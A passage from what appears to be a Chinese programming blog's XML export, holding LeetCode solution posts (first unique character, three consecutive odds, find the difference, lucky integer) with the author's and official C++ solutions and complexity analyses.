<li><p>时间复杂度：$O(n)$，其中 $n$ 是字符串 $s$ 的长度。第一次遍历字符串的时间复杂度为 $O(n)$，第二次遍历哈希映射的时间复杂度为 $O(|\Sigma|)$，由于 $s$ 包含的字符种类数一定小于 $s$ 的长度，因此 $O(|\Sigma|)$ 在渐进意义下小于 $O(n)$，可以忽略。</p>
</li>
<li><p>空间复杂度：$O(|\Sigma|)$，其中 $\Sigma$ 是字符集，在本题中 $s$ 只包含小写字母，因此 $|\Sigma| \leq 26$。我们需要 $O(|\Sigma|)$ 的空间存储哈希映射。</p>
</li>
</ul>
<p><strong>方法三：队列</strong></p>
<p><strong>思路与算法</strong></p>
<p>我们也可以借助队列找到第一个不重复的字符。队列具有「先进先出」的性质，因此很适合用来找出第一个满足某个条件的元素。</p>
<p>具体地，我们使用与方法二相同的哈希映射，并且使用一个额外的队列，按照顺序存储每一个字符以及它们第一次出现的位置。当我们对字符串进行遍历时，设当前遍历到的字符为 c，如果 c 不在哈希映射中，我们就将 c 与它的索引作为一个二元组放入队尾，否则我们就需要检查队列中的元素是否都满足「只出现一次」的要求，即我们不断地根据哈希映射中存储的值（是否为 -1）选择弹出队首的元素，直到队首元素「真的」只出现了一次或者队列为空。</p>
<p>在遍历完成后，如果队列为空，说明没有不重复的字符，返回 -1，否则队首的元素即为第一个不重复的字符以及其索引的二元组。</p>
<p><strong>小贴士</strong></p>
<p>在维护队列时，我们使用了「延迟删除」这一技巧。也就是说，即使队列中有一些字符出现了超过一次，但它只要不位于队首，那么就不会对答案造成影响，我们也就可以不用去删除它。只有当它前面的所有字符被移出队列，它成为队首时，我们才需要将它移除。</p>
<p><strong>c++代码：</strong>(执行用时216ms，击败12.18%，内存消耗11.2M，击败5.29%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">firstUniqChar</span><span class="params">(<span class="built_in">string</span> s)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">unordered_map</span>&lt;<span class="keyword">char</span>, <span class="keyword">int</span>&gt; position;</span><br><span class="line">        <span class="built_in">queue</span>&lt;<span class="built_in">pair</span>&lt;<span class="keyword">char</span>, <span class="keyword">int</span>&gt;&gt; q;</span><br><span class="line">        <span class="keyword">int</span> n = s.size();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!position.count(s[i])) &#123;</span><br><span class="line">                position[s[i]] = i;</span><br><span class="line">                q.emplace(s[i], i);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                position[s[i]] = <span class="number">-1</span>;</span><br><span class="line">                <span class="keyword">while</span> (!q.empty() &amp;&amp; position[q.front().first] == <span class="number">-1</span>) &#123;</span><br><span class="line">                    q.pop();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> q.empty() ? <span class="number">-1</span> : q.front().second;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li><p>时间复杂度：$O(n)$，其中 $n$ 是字符串 $s$ 的长度。遍历字符串的时间复杂度为 $O(n)$，而在遍历的过程中我们还维护了一个队列，由于每一个字符最多只会被放入和弹出队列最多各一次，因此维护队列的总时间复杂度为 $O(|\Sigma|)$，由于 $s$ 包含的字符种类数一定小于 $s$ 的长度，因此 $O(|\Sigma|)$ 在渐进意义下小于 $O(n)$，可以忽略。</p>
</li>
<li><p>空间复杂度：$O(|\Sigma|)$，其中 $\Sigma$是字符集，在本题中 $s$ 只包含小写字母，因此 $|\Sigma| \leq 26$。我们需要 $O(|\Sigma|)$的空间存储哈希映射以及队列。</p>
</li>
</ul>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>官方题解第一种方法和我的思路一样，另外两种方法其实稍微复杂了一点但效率并没有提高反而下降了，还是第一种简单易懂另两种方法个人认为不好，只能说算是一种方法。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>存在连续三个奇数的数组</title>
    <url>/2020/12/24/%E5%AD%98%E5%9C%A8%E8%BF%9E%E7%BB%AD%E4%B8%89%E4%B8%AA%E5%A5%87%E6%95%B0%E7%9A%84%E6%95%B0%E7%BB%84/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/three-consecutive-odds/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>给你一个整数数组 <code>arr</code>，请你判断数组中是否存在连续三个元素都是奇数的情况：如果存在，请返回 <code>true</code> ；否则，返回 <code>false</code> 。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：arr &#x3D; [2,6,4,1]</span><br><span class="line">输出：false</span><br><span class="line">解释：不存在连续三个元素都是奇数的情况。</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：arr &#x3D; [1,2,34,3,4,5,7,23,12]</span><br><span class="line">输出：true</span><br><span class="line">解释：存在连续三个元素都是奇数的情况，即 [5,7,23] 。</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ul>
<li><code>1 &lt;= arr.length &lt;= 1000</code></li>
<li><code>1 &lt;= arr[i] &lt;= 1000</code></li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>遍历数组，n计数为连续奇数的个数，遇到偶数置零重新奇数，若等于3则返回true。<strong>c++代码：</strong>(执行用时8ms，击败70.67%，内存消耗8.6M，击败8.15%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">threeConsecutiveOdds</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; arr)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i:arr)&#123;</span><br><span class="line">            <span class="keyword">if</span>(i%<span class="number">2</span>==<span class="number">1</span>)&#123;</span><br><span class="line">                ++n;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                n=<span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(n==<span class="number">3</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎官 方 题 解💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎</center>

<h6 id="官方题解"><a href="#官方题解" class="headerlink" title="官方题解:"></a><a href="https://leetcode-cn.com/problems/three-consecutive-odds/solution/cun-zai-lian-xu-san-ge-qi-shu-de-shu-zu-by-leetcod/">官方题解</a>:</h6><p><strong>方法一：枚举</strong><br><strong>思路与算法</strong></p>
<p>枚举所有的连续的三个元素，判断这三个元素是否都是奇数，如果是，则返回 true。如果所有的连续的三个元素中，没有一个满足条件，返回 false。</p>
<p><strong>c++代码：</strong>(执行用时12ms，击败16.00%，内存消耗8.4M，击败51.04%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">threeConsecutiveOdds</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; arr)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = arr.size();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= n - <span class="number">3</span>; ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span> ((arr[i] &amp; <span class="number">1</span>) &amp; (arr[i + <span class="number">1</span>] &amp; <span class="number">1</span>) &amp; (arr[i + <span class="number">2</span>] &amp; <span class="number">1</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<p>记原序列的长度为 $n$。</p>
<ul>
<li>时间复杂度：$O(n)$。</li>
<li>空间复杂度：$O(1)$。</li>
</ul>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>官方题解的解法是我一开始想到的思路，后来感觉自己写的效率可能会更好一些就改成这种方法做了。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>找不同</title>
    <url>/2020/12/22/%E6%89%BE%E4%B8%8D%E5%90%8C/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/find-the-difference/submissions/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>给定两个字符串 <strong><em>s</em></strong> 和 <strong><em>t</em></strong>，它们只包含小写字母。</p>
<p>字符串 <strong><em>t</em></strong> 由字符串 <strong><em>s</em></strong> 随机重排，然后在随机位置添加一个字母。</p>
<p>请找出在 <strong><em>t</em></strong> 中被添加的字母。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：s &#x3D; &quot;abcd&quot;, t &#x3D; &quot;abcde&quot;</span><br><span class="line">输出：&quot;e&quot;</span><br><span class="line">解释：&#39;e&#39; 是那个被添加的字母。</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：s &#x3D; &quot;&quot;, t &#x3D; &quot;y&quot;</span><br><span class="line">输出：&quot;y&quot;</span><br></pre></td></tr></table></figure>
<p><strong>示例3：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：s &#x3D; &quot;a&quot;, t &#x3D; &quot;aa&quot;</span><br><span class="line">输出：&quot;a&quot;</span><br></pre></td></tr></table></figure>
<p><strong>示例4：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：s &#x3D; &quot;ae&quot;, t &#x3D; &quot;aea&quot;</span><br><span class="line">输出：&quot;a&quot;</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ul>
<li><code>0 &lt;= s.length &lt;= 1000</code></li>
<li><code>t.length == s.length + 1</code></li>
<li><code>s</code> 和 <code>t</code> 只包含小写字母</li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>计数法：</p>
<p>unordered_map集合（字符为键，次数为值）存储两个字符串中字符出现的次数，只有添加的一个字母次数为奇数其余都为偶数，遍历集合返回值为奇数的键。</p>
<p><strong>c++代码：</strong>(执行用时4ms，击败73.81%，内存消耗7.2M，击败5.03%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">char</span> <span class="title">findTheDifference</span><span class="params">(<span class="built_in">string</span> s, <span class="built_in">string</span> t)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">unordered_map</span>&lt;<span class="keyword">char</span>,<span class="keyword">int</span>&gt; m;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">char</span> c:s)&#123;</span><br><span class="line">            ++m[c];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">char</span> c:t)&#123;</span><br><span class="line">            ++m[c];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//遍历容器查找值为奇数（注意是奇数不是1）的键返回</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> p:m)&#123;</span><br><span class="line">            <span class="keyword">if</span>(p.second%<span class="number">2</span>==<span class="number">1</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> p.first;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//避免报错，随便返回一个字符</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎官 方 题 解💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎</center>

<h6 id="官方题解"><a href="#官方题解" class="headerlink" title="官方题解:"></a><a href="https://leetcode-cn.com/problems/find-the-difference/solution/zhao-bu-tong-by-leetcode-solution-mtqf/">官方题解</a>:</h6><p><strong>方法一：计数</strong><br>首先遍历字符串 s，对其中的每个字符都将计数值加 1；然后遍历字符串 t，对其中的每个字符都将计数值减 1。当发现某个字符计数值为负数时，说明该字符在字符串 t 中出现的次数大于在字符串 s 中出现的次数，因此该字符为被添加的字符。</p>
<p><strong>c++代码：</strong>(执行用时4ms，击败73.81%，内存消耗7M，击败9.86%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">char</span> <span class="title">findTheDifference</span><span class="params">(<span class="built_in">string</span> s, <span class="built_in">string</span> t)</span> </span>&#123;</span><br><span class="line">        <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">cnt</span><span class="params">(<span class="number">26</span>, <span class="number">0</span>)</span></span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">char</span> ch: s) &#123;</span><br><span class="line">            cnt[ch - <span class="string">&#x27;a&#x27;</span>]++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">char</span> ch: t) &#123;</span><br><span class="line">            cnt[ch - <span class="string">&#x27;a&#x27;</span>]--;</span><br><span class="line">            <span class="keyword">if</span> (cnt[ch - <span class="string">&#x27;a&#x27;</span>] &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> ch;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li><p>时间复杂度：$O(N)$，其中 $N$ 为字符串的长度。</p>
</li>
<li><p>空间复杂度：$O(|\Sigma|)$，其中 $\Sigma$ 是字符集，这道题中字符串只包含小写字母，$|\Sigma|=26$。需要使用数组对每个字符计数。</p>
</li>
</ul>
<p><strong>方法二：求和</strong></p>
<p>将字符串 s 中每个字符的 ASCII 码的值求和，得到 $A_s$；对字符串 tt 同样的方法得到 </p>
<p>$A_t$ 。两者的差值 $A_t-A_s$即代表了被添加的字符。</p>
<p><strong>c++代码：</strong>(执行用时0ms，击败100.00%，内存消耗7M，击败17.30%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">char</span> <span class="title">findTheDifference</span><span class="params">(<span class="built_in">string</span> s, <span class="built_in">string</span> t)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> as = <span class="number">0</span>, at = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">char</span> ch: s) &#123;</span><br><span class="line">            as += ch;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">char</span> ch: t) &#123;</span><br><span class="line">            at += ch;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> at - as;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li><p>时间复杂度：$O(N)$。</p>
</li>
<li><p>空间复杂度：$O(1)$。</p>
</li>
</ul>
<p><strong>方法三：位运算</strong></p>
<p>如果将两个字符串拼接成一个字符串，则问题转换成求字符串中出现奇数次的字符。</p>
<p>类似于「 <a href="https://z2bns.github.io/2020/11/25/%E5%8F%AA%E5%87%BA%E7%8E%B0%E4%B8%80%E6%AC%A1%E7%9A%84%E6%95%B0%E5%AD%97/">只出现一次的数字</a>」，我们使用位运算的技巧解决本题。</p>
<p><strong>c++代码：</strong>(执行用时0ms，击败100.00%，内存消耗7M，击败8.27%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">char</span> <span class="title">findTheDifference</span><span class="params">(<span class="built_in">string</span> s, <span class="built_in">string</span> t)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> ret = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">char</span> ch: s) &#123;</span><br><span class="line">            ret ^= ch;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">char</span> ch: t) &#123;</span><br><span class="line">            ret ^= ch;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li><p>时间复杂度：$O(N)$。</p>
</li>
<li><p>空间复杂度：$O(1)$。</p>
</li>
</ul>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>题目也比较简单，官方题解给出了多种解法，也比较全面。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>找出数组中的幸运数</title>
    <url>/2020/12/24/%E6%89%BE%E5%87%BA%E6%95%B0%E7%BB%84%E4%B8%AD%E7%9A%84%E5%B9%B8%E8%BF%90%E6%95%B0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/find-lucky-integer-in-an-array/submissions/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>在整数数组中，如果一个整数的出现频次和它的数值大小相等，我们就称这个整数为「幸运数」。</p>
<p>给你一个整数数组 arr，请你从中找出并返回一个幸运数。</p>
<p>如果数组中存在多个幸运数，只需返回 最大 的那个。<br>如果数组中不含幸运数，则返回 -1 。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：arr &#x3D; [2,2,3,4]</span><br><span class="line">输出：2</span><br><span class="line">解释：数组中唯一的幸运数是 2 ，因为数值 2 的出现频次也是 2 。</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：arr &#x3D; [1,2,2,3,3,3]</span><br><span class="line">输出：3</span><br><span class="line">解释：1、2 以及 3 都是幸运数，只需要返回其中最大的 3 。</span><br></pre></td></tr></table></figure>
<p><strong>示例3：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：arr &#x3D; [2,2,2,3,3]</span><br><span class="line">输出：-1</span><br><span class="line">解释：数组中不存在幸运数。</span><br></pre></td></tr></table></figure>
<p><strong>示例4：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：arr &#x3D; [5]</span><br><span class="line">输出：-1</span><br></pre></td></tr></table></figure>
<p><strong>示例5：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：arr &#x3D; [7,7,7,7,7,7,7]</span><br><span class="line">输出：7</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ul>
<li><code>1 &lt;= arr.length &lt;= 500</code></li>
<li><code>1 &lt;= arr[i] &lt;= 500</code></li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>统计数组中整数出现的频次存到map集合中，然后遍历map集合返回最大的那个幸运数。</p>
<p><strong>c++代码：</strong>(执行用时12ms，击败87.94%，内存消耗10.5M，击败20.56%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">findLucky</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; arr)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">unordered_map</span>&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt; m;</span><br><span class="line">        <span class="keyword">int</span> result=<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i:arr)&#123;</span><br><span class="line">            ++m[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> [j,k]:m)&#123;</span><br><span class="line">            <span class="keyword">if</span>(j==k)&#123;</span><br><span class="line">                result=j&gt;result?j:result;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎官 方 题 解💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎</center>

<h6 id="官方题解"><a href="#官方题解" class="headerlink" title="官方题解:"></a><a href="https://leetcode-cn.com/problems/find-lucky-integer-in-an-array/solution/zhao-chu-shu-zu-zhong-de-xing-yun-shu-by-leetcode-/">官方题解</a>:</h6><p><strong>方法一：哈希映射</strong><br><strong>思路</strong></p>
<p>我们可以使用哈希映射来解决这个问题，把数值作为键，把数值出现的次数作为值。具体地，我们先遍历原数组建立哈希表，然后遍历哈希表找到最大的键和值相等的元素作为答案，如果找不到就返回 -1。</p>
<p><img src="https://assets.leetcode-cn.com/solution-static/1394_fig1.gif" alt="fig1"></p>
<p><strong>c++代码：</strong>(执行用时12ms，击败87.94%，内存消耗10.5M，击败20.56%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">unordered_map</span> &lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt; m;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">findLucky</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; arr)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> x: arr) ++m[x];</span><br><span class="line">        <span class="keyword">int</span> ans = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> [key, value]: m) &#123;</span><br><span class="line">            <span class="keyword">if</span> (key == value) &#123;</span><br><span class="line">                ans = max(ans, key);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<p>记数组中的的元素个数为 $n$，则哈希表中最多有 $n$ 个键值对。</p>
<ul>
<li><p>时间复杂度：遍历数组的时间代价是 $O(n)$，遍历哈希表的时间代价也是 $O(n)$，故渐进时间复杂度 $O(n)$。</p>
</li>
<li><p>空间复杂度：哈希表中最多有 $n$ 个键值对，故渐进空间复杂度 $O(n)$。</p>
</li>
</ul>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>哈希映射计数法，简单题。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>数组中出现次数超过一半的数字</title>
    <url>/2020/12/22/%E6%95%B0%E7%BB%84%E4%B8%AD%E5%87%BA%E7%8E%B0%E6%AC%A1%E6%95%B0%E8%B6%85%E8%BF%87%E4%B8%80%E5%8D%8A%E7%9A%84%E6%95%B0%E5%AD%97/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><a href="https://leetcode-cn.com/problems/shu-zu-zhong-chu-xian-ci-shu-chao-guo-yi-ban-de-shu-zi-lcof/">题目地址</a></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>数组中有一个数字出现的次数超过数组长度的一半，请找出这个数字。</p>
